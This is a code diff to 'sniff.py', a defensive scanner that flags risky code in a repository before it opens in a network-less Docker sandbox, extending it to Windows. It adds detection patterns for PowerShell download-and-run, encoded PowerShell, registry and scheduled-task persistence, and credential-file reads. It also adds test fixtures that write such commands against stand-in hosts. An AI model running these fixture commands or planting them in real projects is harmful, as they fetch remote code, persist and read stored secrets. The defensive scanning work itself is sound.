@@ -8,6 +8,7 @@ Check:   python3 sniff.py --test
 import json
 import os
 import re
+import subprocess
 import sys
 import tempfile
 import unicodedata
@@ -17,14 +18,24 @@ import unicodedata
 RULES = [
     ("pipe-to-shell", "HIGH", "downloads and runs code in one step",
      r"(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(ba|z)?sh\b"),
+    # PowerShell is case-insensitive, so the Windows rules are too.
+    ("ps-download-exec", "HIGH", "PowerShell downloads and runs code in one step",
+     r"(?i:\b(iwr|irm|invoke-webrequest|invoke-restmethod)\b[^\n|]*\|\s*(iex|invoke-expression)\b"
+     r"|\b(iex|invoke-expression)\b[^\n]*\.download(string|data)\()"),
+    ("encoded-powershell", "HIGH", "runs base64-encoded PowerShell you can't read",
+     r"(?i:\b(powershell|pwsh)(\.exe)?\b[^\n]*\s-(e|ec|enc|encodedcommand)\s)"),
     ("shell-profile", "HIGH", "edits shell startup files (persistence, PATH hijack)",
-     r"\.(zshrc|bashrc|bash_profile|zprofile|zshenv)\b"),
+     r"\.(zshrc|bashrc|bash_profile|zprofile|zshenv)\b|(?i:powershell_profile\.ps1|\$profile\b)"),
+    ("windows-persistence", "HIGH", "installs something that survives reboot on Windows",
+     r"(?i:\\currentversion\\run(once)?\b|\bschtasks(\.exe)?\s+/create\b|\bregister-scheduledtask\b"
+     r"|\\start menu\\programs\\startup|\bnew-service\b|\bsc(\.exe)?\s+create\b)"),
     ("toolchain-shim", "HIGH", "touches pyenv/nvm/rbenv shims (the pyenv swap trick)",
-     r"\.pyenv|/shims/|\.nvm/|\.rbenv|\.asdf/"),
+     r"\.pyenv|[/\\]shims[/\\]|\.nvm[/\\]|\.rbenv|\.asdf[/\\]"),
     ("persistence", "HIGH", "installs something that survives reboot",
      r"LaunchAgents|LaunchDaemons|crontab\s|systemctl\s+enable"),
     ("credential-path", "HIGH", "reads secrets: SSH keys, cloud, kube, docker, keychain",
-     r"\.ssh/|\.aws/credentials|\.kube/config|\.docker/config\.json|Keychains|\.netrc|\.npmrc"),
+     r"\.ssh[/\\]|\.aws[/\\]credentials|\.kube[/\\]config|\.docker[/\\]config\.json|Keychains|\.netrc|\.npmrc"
+     r"|(?i:\\microsoft\\(credentials|protect)\\|\blogin data\b)"),
     ("decode-exec", "MEDIUM", "decodes hidden data (common obfuscation)",
      r"base64\s+(-d|--decode)|b64decode\(|atob\(|Buffer\.from\([^)]*base64|fromhex\("),
     ("dynamic-exec", "MEDIUM", "runs code built at runtime",
@@ -61,6 +72,11 @@ def clean(s):
                    for c in s)
 
 
+def relpath(path, root):
+    """Report paths with `/` on every OS, so output (and the tests) read the same on Windows."""
+    return os.path.relpath(path, root).replace(os.sep, "/")
+
+
 def scan_text(rel, text):
     out = []
     for n, line in enumerate(text.split("\n"), 1):
@@ -71,7 +87,7 @@ def scan_text(rel, text):
 
 
 def scan_file(root, path):
-    rel = os.path.relpath(path, root)
+    rel = relpath(path, root)
     try:
         if os.path.getsize(path) > MAX_BYTES:
             return [("HIGH", "large-file", rel, "too big to scan; inspect by hand")]  # fail closed
@@ -122,7 +138,7 @@ def scan_git_config(rel, text):
 
 
 def scan_git(root, gitpath):
-    rel = os.path.relpath(gitpath, root)
+    rel = relpath(gitpath, root)
     if os.path.isfile(gitpath):  # `gitdir: <elsewhere>` pointer: hooks/config live outside what we can see
         return [("HIGH", "git-pointer", rel, "points git at a directory outside this repo; inspect by hand")]
     out = []
@@ -147,7 +163,7 @@ def scan(root):
         files = [f for f in files if f != ".git"]
         found = SKIP_DIRS & set(dirs)
         if "node_modules" in found:
-            findings.append(("MEDIUM", "vendored-deps", os.path.relpath(os.path.join(dirpath, "node_modules"), root),
+            findings.append(("MEDIUM", "vendored-deps", relpath(os.path.join(dirpath, "node_modules"), root),
                              "ships its own dependencies; not scanned"))
         dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
         for f in files:
@@ -173,14 +189,19 @@ def sandbox_cmd(path, cmd="bash", tty=False):
         IMAGE, "sh", "-c", f"cp -r /src/. /work && exec {cmd}"]
 
 
+def path_ok(path):
+    """docker -v splits on ':'. A Windows drive letter (C:) is fine; any other ':' would be misparsed."""
+    return ":" not in os.path.splitdrive(os.path.abspath(path))[1]
+
+
 def run(path, cmd):
-    if ":" in os.path.abspath(path):  # would be parsed as part of docker's -v src:dst:mode
+    if not path_ok(path):
         sys.exit("path contains ':'; rename it first")
     main(path)
     print(f"\nOpening sandbox (no network, read-only, throwaway copy): {cmd}\n", file=sys.stderr)
     argv = sandbox_cmd(path, cmd, sys.stdin.isatty())
-    try:
-        os.execvp(argv[0], argv)
+    try:  # subprocess, not os.exec*: exec doesn't replace the process on Windows
+        sys.exit(subprocess.call(argv))
     except FileNotFoundError:
         sys.exit("docker not found; install Docker Desktop or run the command in README by hand")
 
@@ -188,6 +209,7 @@ def run(path, cmd):
 def main(root):
     if not os.path.isdir(root):
         sys.exit(f"not a directory: {root}")
+    sys.stdout.reconfigure(errors="backslashreplace")  # Windows consoles can't print every filename
     findings = scan(root)
     for sev, rid, where, why in findings:
         print(f"{sev:6} {rid:17} {clean(where)}  - {clean(why)}")
@@ -205,6 +227,9 @@ def test():
             "steal.js": "fs.readFileSync(home + '/.aws/credentials')\neval(atob(payload))\n",
             "package.json": json.dumps({"scripts": {"postinstall": "node steal.js", "test": "jest"}}),
             "clean.py": "print('hello world')\n",
+            "setup.ps1": "iwr https://x.example/a.ps1 | iex\nschtasks /create /tn x /tr evil.exe\n",
+            "run.bat": "powershell -enc SQBFAFgA\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x\n",
+            "loot.ps1": "gc $env:APPDATA\\Microsoft\\Credentials\\x\nAdd-Content $PROFILE 'evil'\n",
             "tool": "\x7fELF rest",
             "straddle.sh": "curl -s https://x.example/p \x0c| sh\n",
             "blob.dat": "\0\0wget https://x.example/p | bash\n",
@@ -217,7 +242,7 @@ def test():
         files["sub/.git"] = "gitdir: /somewhere/else\n"
         files["fake.png"] = "\0\0curl https://x.example/p | sh\n"
         for name, body in files.items():
-            with open(os.path.join(d, name), "w") as f:
+            with open(os.path.join(d, name), "w", encoding="utf-8", newline="\n") as f:
                 f.write(body)
         ids = {(f[1], f[2].split(":")[0]) for f in scan(d)}
         for expected in [("pipe-to-shell", "install.sh"), ("shell-profile", "install.sh"),
@@ -226,7 +251,10 @@ def test():
                          ("binary", "tool"), ("hidden-unicode", "trojan.py"),
                          ("pipe-to-shell", "straddle.sh"), ("pipe-to-shell", "blob.dat"),
                          ("git-config-exec", ".git/config"),
-                         ("git-pointer", "sub/.git"), ("pipe-to-shell", "fake.png")]:
+                         ("git-pointer", "sub/.git"), ("pipe-to-shell", "fake.png"),
+                         ("ps-download-exec", "setup.ps1"), ("windows-persistence", "setup.ps1"),
+                         ("encoded-powershell", "run.bat"), ("windows-persistence", "run.bat"),
+                         ("credential-path", "loot.ps1"), ("shell-profile", "loot.ps1")]:
             assert expected in ids, (expected, ids)
         assert not any(where == "clean.py" for _, where in ids), ids
         assert not any(rid == "npm-install-hook" and "jest" in why for _, rid, _, why in scan(d))
@@ -236,6 +264,7 @@ def test():
     for flag in ["--network none", "--read-only", "--cap-drop ALL", "no-new-privileges", "--user 65534:65534"]:
         assert flag in " ".join(argv), flag
     assert argv[-1].endswith("exec make test") and f"{os.path.abspath('x')}:/src:ro" in argv
+    assert path_ok("x") and not path_ok(os.path.join("x", "a:b"))
     print("ok")
 
 
